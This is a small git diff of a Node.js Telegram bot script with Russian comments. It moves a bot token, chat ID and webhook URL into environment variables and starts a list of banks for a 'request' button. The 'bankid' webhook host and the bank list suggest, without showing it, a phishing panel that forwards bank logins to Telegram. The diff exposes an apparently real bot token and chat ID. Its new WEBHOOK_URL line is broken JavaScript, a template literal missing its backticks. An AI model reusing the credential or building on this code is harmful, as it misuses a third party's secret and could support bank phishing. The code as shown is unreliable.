@@ -4,10 +4,10 @@ const TelegramBot = require('node-telegram-bot-api');
 const WebSocket = require('ws');
 const path = require('path');
 
-// НАСТРОЙКИ
-const TELEGRAM_BOT_TOKEN = '7607171529:AAF4Tch8CyVujvaMhN33_tlasoGAHVmxv64';
-const CHAT_ID = '-4970332008';
-const WEBHOOK_URL = 'https://bankid-audu.onrender.com/bot' + TELEGRAM_BOT_TOKEN;
+// Настройки
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '7607171529:AAF4Tch8CyVujvaMhN33_tlasoGAHVmxv64';
+const CHAT_ID = process.env.CHAT_ID || '-4970332008';
+const WEBHOOK_URL = process.env.WEBHOOK_URL || https://${process.env.RENDER_EXTERNAL_URL || 'new-l8h6.onrender.com'}/bot${TELEGRAM_BOT_TOKEN};
 
 // СПИСОК БАНКОВ ДЛЯ КНОПКИ "ЗАПРОС"
 const banksForRequestButton = [
